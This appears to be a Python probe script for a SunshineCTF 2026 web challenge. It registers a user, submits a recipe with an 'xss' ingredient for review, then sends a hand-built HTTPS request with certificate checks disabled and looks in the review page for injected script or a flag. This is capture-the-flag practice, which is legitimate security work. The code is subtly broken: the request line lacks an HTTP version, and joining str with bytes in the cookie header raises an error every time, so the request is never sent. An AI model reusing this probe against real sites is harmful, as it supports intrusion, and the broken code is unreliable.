#!/usr/bin/env python3
import sys,time,socket,ssl,json,re;sys.path.insert(0,'analysis')
from cc import Client
BASE="https://tomorrow.web.2026.sunshinectf.games"

def log(*a):
    msg = " ".join(str(x) for x in a) + "\n"
    sys.stdout.buffer.write(msg.encode("utf-8","replace"))
    sys.stdout.flush()

log("=== setup ===")
c=Client()
code,out,_=c.post("/register",{"username":"smptest%05d"%(int(time.time())%100000),"password":"Passw0rd!"})
u=out["user"]
code,out,_=c.post("/api/recipe",{"title":"p","ingredients":[{"name":"xss","value":"test"}]})
rid=str(out["id"])
c.post("/api/recipe/%s/submit"%rid,{})
time.sleep(10)
c.post("/login",{"username":u,"password":"Passw0rd!"})
session=c.jar.get("session")
role=c.jar.get("role")
if not session:
    log("No session");sys.exit(1)

log("User:",u,"rid:",rid[:8],"...","session len:",len(session))

ctx=ssl.create_default_context()
ctx.check_hostname=False
ctx.verify_mode=ssl.CERT_NONE
try:
    s=ctx.wrap_socket(socket.create_connection((BASE.split("//")[1],443),timeout=25),server_hostname=BASE.split("//")[1])
    
    # Ensure everything is properly encoded
    rid_bytes = str(rid).encode()
    host_bytes = str(BASE.split("//")[1]).encode()
    sess_bytes = str(session).encode()
    role_bytes = str(role).encode()
    
    req = b"GET /review/"+rid_bytes+b"\r\nHost: "+host_bytes+b"\r\nCookie: session="+sess_bytes+"; role="+role_bytes+b"\r\n\r\n"
    s.sendall(req)
    resp=s.recv(8192)[:10000]
    s.close()
    
    log("Response len:",len(resp))
    log("Has alert?",b"<script>alert" in resp)
    log("Has golden class?",rb'class="seal gold"' in resp or rb'class="flag"' in resp)
    
    resp_str=resp.decode(errors="replace")
    if re.search(r'class="seal gold"|class="flag"',resp_str):
        log("FOUND GOLDEN BLOCK!")
        open("files/smog_golden.html","wb").write(resp)
except Exception as e:
    log("Error:",e)
    import traceback
    traceback.print_exc()
log("Done")
